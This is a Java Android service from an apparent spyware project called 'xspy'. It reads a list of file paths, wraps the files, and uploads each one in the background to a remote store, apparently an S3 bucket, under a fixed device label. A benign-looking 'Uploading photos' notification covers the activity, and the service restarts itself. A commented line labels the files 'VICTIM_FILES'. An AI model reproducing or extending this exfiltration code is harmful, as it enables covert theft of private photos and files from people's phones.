package com.redeyesncode.xspy.backend.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.redeyesncode.xspy.R;
import com.redeyesncode.xspy.backend.AndroidContactModel;
import com.redeyesncode.xspy.models.FileBody;
import com.redeyesncode.xspy.repo.MainRepository;
import com.redeyesncode.xspy.utils.Constants;

import java.io.File;
import java.util.ArrayList;
import java.util.Objects;

public class FileUploadService extends Service {

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        Toast.makeText(this, " FileUploadService onBind ", Toast.LENGTH_LONG).show();

        return null;
    }

    @Override
    public void onCreate() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    "UPLOAD_CHANNEL_ID",
                    "File Upload Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
        Toast.makeText(this, " FileUploadService Created ", Toast.LENGTH_LONG).show();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification notification = new NotificationCompat.Builder(this, "UPLOAD_CHANNEL_ID")
                    .setContentTitle("Uploading Photos")
                    .setContentText("Uploading your images in background...")
                    .setSmallIcon(R.drawable.ic_app) // Use a valid small icon here
                    .setPriority(NotificationCompat.PRIORITY_LOW)
                    .build();

            startForeground(1, notification);
        }


        Toast.makeText(this, " FileUploadService Started", Toast.LENGTH_LONG).show();

        try{
            // Call the API here
//                    ArrayList<FileBody> fileBodies = intent.getParcelableArrayListExtra("VICTIM_FILES");

            ArrayList<String> paths = intent.getStringArrayListExtra("FILE_PATHS");
            ArrayList<FileBody> fileBodies = new ArrayList<>();
            for (String path : paths) {
                fileBodies.add(new FileBody(new File(path)));
            }


            new ImageUploadApiCall(fileBodies).execute();
        }catch (Exception e){
            Log.i(Constants.DEV_XSPY, Objects.requireNonNull(e.getMessage()));
            Log.i(Constants.DEV_XSPY, Objects.requireNonNull(e.getMessage()));


        }
        return START_STICKY;
    }

    private class ImageUploadApiCall extends AsyncTask<Void, Void, Void> {
        private ArrayList<FileBody> fileBodies;
        public ImageUploadApiCall(ArrayList<FileBody> contactModels) {
            this.fileBodies = contactModels;
        }

        @Override
        protected Void doInBackground(Void... voids) {
            MainRepository mainRepository = new MainRepository();
            for (FileBody fileBody:
                    fileBodies) {
                // Here file is returned null.
                // issue check : 26 Apr 2023
                Log.i(Constants.DEV_XSPY+"Service",fileBody.getFile().getName());
                Log.i(Constants.DEV_XSPY+"Service",fileBody.getFile().getName());

                mainRepository.uploadMedia(fileBody.getFile(),"ASHU_ANDROID");
            }
            return null;
        }
        @Override
        protected void onPostExecute(Void aVoid) {
            // Handle any UI updates here
            Toast.makeText(FileUploadService.this, "Uploaded YOUR IMAGES AWS S3 Bucket !", Toast.LENGTH_LONG).show();

            stopForeground(true); // Remove notification
            stopSelf();
        }
    }

}
